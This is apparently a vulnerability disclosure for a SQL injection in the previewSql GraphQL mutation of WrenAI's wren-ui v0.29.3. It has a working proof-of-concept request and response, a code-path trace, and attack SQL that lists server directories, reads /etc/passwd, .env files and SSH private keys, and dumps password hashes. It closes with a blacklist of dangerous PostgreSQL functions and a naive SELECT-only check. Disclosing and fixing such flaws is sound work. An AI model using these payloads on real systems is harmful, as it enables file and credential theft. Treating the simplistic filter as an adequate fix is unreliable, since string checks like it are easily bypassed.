# Security Vulnerability Report: GraphQL previewSql Direct SQL Injection

## Vulnerability Summary

**Vulnerability Type**: SQL Injection (Direct Injection)
**Severity**: 🔴 Critical
**CVSS Score**: 9.0-10.0
**Affected Version**: wren-ui v0.29.3 (potentially affects earlier versions)
**Affected Component**: wren-ui (Apollo GraphQL Server)

**Description**:

WrenAI's GraphQL API exposes a `previewSql` mutation that allows users to directly submit arbitrary SQL statements for execution. This interface has **no input validation, whitelist restrictions, or blacklist filtering**. Attackers can execute arbitrary SQL statements, including PostgreSQL dangerous functions (such as `pg_read_file`, `pg_ls_dir`, `pg_execute`, etc.), leading to:

- ✅ Verified exploitable
- Arbitrary file reading (system configuration files, application secrets, source code)
- Filesystem traversal (listing directory structures)
- Complete database takeover (if write permissions exist)
- Potential remote code execution (via `COPY TO PROGRAM`)

---

## PoC: Exploitation Demonstration

### Attack Request

```http
POST /api/graphql HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Content-Length: 226

{
  "operationName": "PreviewSQL",
  "variables": {
    "data": {
      "sql": "select pg_ls_dir('/')",
      "limit": 50,
      "dryRun": false
    }
  },
  "query": "mutation PreviewSQL($data: PreviewSQLDataInput!) {\n  previewSql(data: $data)\n}"
}
```

### Attack Response (Successful)

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "previewSql": {
      "correlationId": "16da111c-6e0b-4b65-8d94-112a71ae877c",
      "cacheHit": false,
      "override": false,
      "columns": [{ "name": "pg_ls_dir", "type": "string" }],
      "data": [
        ["lib"], ["dev"], ["usr"], ["media"], ["home"],
        ["srv"], ["etc"], ["bin"], ["opt"], ["run"],
        ["var"], ["sys"], ["proc"], ["root"], ["sbin"],
        ["mnt"], ["tmp"], ["docker-entrypoint-initdb.d"],
        [".dockerenv"]
      ]
    }
  }
}
```

**Result**: Successfully listed all files and folders in the server's root directory.

---

## Complete Call Chain

### Architecture Overview

```
User Browser → Wren UI (Next.js :3000)
                ↓ GraphQL POST /api/graphql
              Apollo GraphQL Server (embedded in Next.js API Routes)
                ↓ previewSql Mutation
              ModelResolver.previewSql()
                ↓
              QueryService.preview()
                ↓ Branch by data source type
              ┌─────────────────┴─────────────────┐
              ↓                                   ↓
        WrenEngineAdaptor                  IbisAdaptor
      (DuckDB datasource)            (PostgreSQL/BigQuery/etc.)
              ↓                                   ↓
        Wren Engine (:8080)               Ibis Server (:8000)
              ↓                                   ↓
          Execute SQL                         Execute SQL
              ↓                                   ↓
          Database                             Database
```

### Detailed Call Chain (PostgreSQL datasource example)

```
1. User sends GraphQL Mutation
   POST /api/graphql
   Body: { operationName: "PreviewSQL", variables: { data: { sql: "malicious SQL" } } }
   ↓

2. Apollo GraphQL Server routing
   wren-ui/pages/api/graphql.ts
   ↓

3. GraphQL Resolver
   File: wren-ui/src/apollo/server/resolvers/modelResolver.ts
   Function: ModelResolver.previewSql() (Lines 935-952)
   ↓
   ⚠️ Sink Point 1: Line 940
   const { sql, projectId, limit, dryRun } = args.data;
   // sql directly extracted from user input, no validation
   ↓

4. QueryService
   File: wren-ui/src/apollo/server/services/queryService.ts
   Function: QueryService.preview() (Lines 98-141)
   ↓
   Lines 111-123: Select execution path based on datasource type
   - DuckDB → wrenEngineAdaptor.previewData()
   - Others → ibisAdaptor.query()
   ↓

5. IbisAdaptor (PostgreSQL path)
   File: wren-ui/src/apollo/server/adaptors/ibisAdaptor.ts
   Function: IbisAdaptor.query() (Lines 288-318)
   ↓
   ⚠️ Sink Point 2: Lines 296-300
   const body = {
     sql: query,  // ⚠️ Malicious SQL directly placed in request body
     connectionInfo: ibisConnectionInfo,
     manifestStr: Buffer.from(JSON.stringify(mdl)).toString('base64'),
   };
   ↓
   Lines 302-310: HTTP POST request
   await axios.post(
     `${this.ibisServerEndpoint}/.../query`,
     body,  // ⚠️ Contains malicious SQL
     { params: { limit: options.limit || DEFAULT_PREVIEW_LIMIT } }
   );
   ↓

6. Ibis Server
   HTTP POST http://ibis-server:8000/v3/connector/postgres/query
   Request Body: { "sql": "select pg_ls_dir('/')", ... }
   ↓

7. PostgreSQL Database
   Execute malicious SQL: SELECT pg_ls_dir('/')
   ↓

8. Result return path
   PostgreSQL → Ibis Server → IbisAdaptor → QueryService → ModelResolver → GraphQL Response → User
```

---

## Core Sink Point Analysis

### Sink Point 1: ModelResolver.previewSql()

**File**: `wren-ui/src/apollo/server/resolvers/modelResolver.ts`
**Lines**: 935-952

```typescript
// Notice: this is used by AI service.
// any change to this resolver should be synced with AI service.
public async previewSql(
  _root: any,
  args: { data: PreviewSQLData },
  ctx: IContext,
) {
  const { sql, projectId, limit, dryRun } = args.data;  // ⚠️ User input directly extracted
  const project = projectId
    ? await ctx.projectService.getProjectById(parseInt(projectId))
    : await ctx.projectService.getCurrentProject();
  const { manifest } = await ctx.deployService.getLastDeployment(project.id);
  return await ctx.queryService.preview(sql, {  // ⚠️ SQL directly passed, no validation
    project,
    limit: limit,
    modelingOnly: false,
    manifest,
    dryRun,
  });
}
```

**Issues**:
- ❌ `sql` parameter directly extracted from GraphQL input
- ❌ No type checking (e.g., only allowing SELECT)
- ❌ No blacklist filtering of dangerous functions
- ❌ No whitelist restriction on allowed functions
- ❌ Directly passed to `queryService.preview()`

---

### Sink Point 2: QueryService.preview()

**File**: `wren-ui/src/apollo/server/services/queryService.ts`
**Lines**: 98-141

```typescript
public async preview(
  sql: string,  // ⚠️ Malicious SQL
  options: PreviewOptions,
): Promise<IbisResponse | PreviewDataResponse | boolean> {
  const {
    project,
    manifest: mdl,
    limit,
    dryRun,
    refresh,
    cacheEnabled,
  } = options;
  const { type: dataSource, connectionInfo } = project;

  if (this.useEngine(dataSource)) {  // DuckDB
    if (dryRun) {
      logger.debug('Using wren engine to dry run');
      await this.wrenEngineAdaptor.dryRun(sql, {  // ⚠️ SQL passed
        manifest: mdl,
        limit,
      });
      return true;
    } else {
      logger.debug('Using wren engine to preview');
      const data = await this.wrenEngineAdaptor.previewData(sql, mdl, limit);  // ⚠️ SQL passed
      return data as PreviewDataResponse;
    }
  } else {  // PostgreSQL/BigQuery/Snowflake/etc.
    this.checkDataSourceIsSupported(dataSource);
    logger.debug('Use ibis adaptor to preview');
    if (dryRun) {
      return await this.ibisDryRun(sql, dataSource, connectionInfo, mdl);  // ⚠️ SQL passed
    } else {
      return await this.ibisQuery(  // ⚠️ SQL passed
        sql,
        dataSource,
        connectionInfo,
        mdl,
        limit,
        refresh,
        cacheEnabled,
      );
    }
  }
}
```

**Issues**:
- ❌ `sql` parameter continues to be passed without any validation
- ❌ Only checks if datasource type is supported, not SQL security
- ❌ No security checks whether `dryRun` or actual execution

---

### Sink Point 3: IbisAdaptor.query()

**File**: `wren-ui/src/apollo/server/adaptors/ibisAdaptor.ts`
**Lines**: 288-318

```typescript
public async query(
  query: string,  // ⚠️ Malicious SQL
  options: IbisQueryOptions,
): Promise<IbisQueryResponse> {
  const { dataSource, mdl } = options;
  const connectionInfo = this.updateConnectionInfo(options.connectionInfo);
  const ibisConnectionInfo = toIbisConnectionInfo(dataSource, connectionInfo);
  const queryString = this.buildQueryString(options);

  const body = {
    sql: query,  // ⚠️ Malicious SQL placed in request body
    connectionInfo: ibisConnectionInfo,
    manifestStr: Buffer.from(JSON.stringify(mdl)).toString('base64'),
  };

  try {
    const res = await axios.post(
      `${this.ibisServerEndpoint}/${this.getIbisApiVersion(IBIS_API_TYPE.QUERY)}/connector/${dataSourceUrlMap[dataSource]}/query${queryString}`,
      body,  // ⚠️ Sending request containing malicious SQL
      {
        params: {
          limit: options.limit || DEFAULT_PREVIEW_LIMIT,
        },
      },
    );
    return {
      ...res.data,
      correlationId: res.headers['x-correlation-id'],
      processTime: res.headers['x-process-time'],
      // ...
    };
  } catch (err: any) {
    // ...
  }
}
```

**Issues**:
- ❌ `query` parameter directly placed in HTTP request body
- ❌ No final security check opportunity
- ❌ Ibis Server trusts all SQL requests from UI

---

## Root Causes of Vulnerability

### 1. Missing Input Validation

**All code paths lack validation of user-input SQL**:
- modelResolver.ts (Line 940) - Receives user input
- queryService.ts (Lines 98-141) - Passes SQL
- ibisAdaptor.ts (Lines 288-318) - Sends SQL

**Validations that should exist (but are completely missing)**:
- ✗ SQL statement type checking (whether it's only SELECT)
- ✗ Dangerous function blacklist filtering (pg_read_file, pg_ls_dir, pg_execute, etc.)
- ✗ Table access permission checking
- ✗ Column access permission checking
- ✗ Length limits
- ✗ Special character escaping

### 2. Design Flaw: Over-trusting User Input

Code comment (modelResolver.ts:933-934) shows:
```typescript
// Notice: this is used by AI service.
// any change to this resolver should be synced with AI service.
```

**Problem Analysis**:
- This interface was likely designed to provide SQL preview functionality for AI Service
- But **does not distinguish between AI Service calls and regular user calls**
- Regular users can directly call this interface through GraphQL API
- No authentication or authorization checks to restrict who can use this interface

## Exploitation Scenarios

### Scenario 1: Filesystem Traversal

**Attack SQL**:
```sql
SELECT pg_ls_dir('/')
SELECT pg_ls_dir('/etc')
SELECT pg_ls_dir('/app')
SELECT pg_ls_dir('/var/www')
```

**Result**: List server filesystem directory structure

---

### Scenario 2: Read Sensitive Files

**Attack SQL**:
```sql
SELECT pg_read_file('/etc/passwd')
SELECT pg_read_file('/app/.env')
SELECT pg_read_file('/app/config.yaml')
SELECT pg_read_file('/root/.ssh/id_rsa')
```

**Result**: Read system password file, application configuration, SSH private keys, etc.

---

### Scenario 3: Database Schema Disclosure

**Attack SQL**:
```sql
SELECT table_name FROM information_schema.tables
SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users'
SELECT * FROM pg_shadow  -- PostgreSQL user password hashes
```

**Result**: Complete database structure and sensitive metadata

---

### Scenario 4: Data Leakage

**Attack SQL**:
```sql
SELECT * FROM users
SELECT username, password, email FROM admin_users
SELECT * FROM credentials
```

**Result**: Sensitive business data leakage

---

## Impact Scope

### Data Leakage
- ✅ Verified: Read arbitrary files (`/etc/passwd`)
- ✅ Verified: Filesystem traversal (`pg_ls_dir('/')`)
- ⚠️ Potential: Complete database schema disclosure
- ⚠️ Potential: All business data leakage

### Privilege Escalation
- ⚠️ Potential: Modify user permissions (if UPDATE permission exists)
- ⚠️ Potential: Create administrator accounts

### Remote Code Execution
- ⚠️ Potential: Execute system commands via `COPY TO PROGRAM` (requires high privileges)
- ⚠️ Potential: Execute code via PostgreSQL extensions (e.g., `plpythonu`)

### Denial of Service
- ⚠️ Potential: Execute time-consuming queries (Cartesian products, recursive queries)
- ⚠️ Potential: DROP TABLE / TRUNCATE

---

## Remediation Recommendations (For Developer Reference)

### Immediate Actions (Critical)

1. **SQL Statement Type Whitelist**
   ```typescript
   // Only allow SELECT statements
   if (!sql.trim().toUpperCase().startsWith('SELECT')) {
     throw new Error('Only SELECT statements are allowed');
   }
   ```

2. **Dangerous Function Blacklist**
   ```typescript
   const DANGEROUS_FUNCTIONS = [
     'pg_read_file', 'pg_ls_dir', 'pg_execute', 'pg_read_binary_file',
     'pg_stat_file', 'copy', 'copy to program', 'lo_import', 'lo_export',
     'dblink', 'dblink_exec', 'create', 'drop', 'alter', 'truncate',
     'insert', 'update', 'delete', 'grant', 'revoke'
   ];
   
   const sqlLower = sql.toLowerCase();
   for (const func of DANGEROUS_FUNCTIONS) {
     if (sqlLower.includes(func)) {
       throw new Error(`Dangerous function detected: ${func}`);
     }
   }
   ```

---

## Test Environment

- wren-ui: v0.29.3
- Database: PostgreSQL 14
- Test Date: 2026-02-04

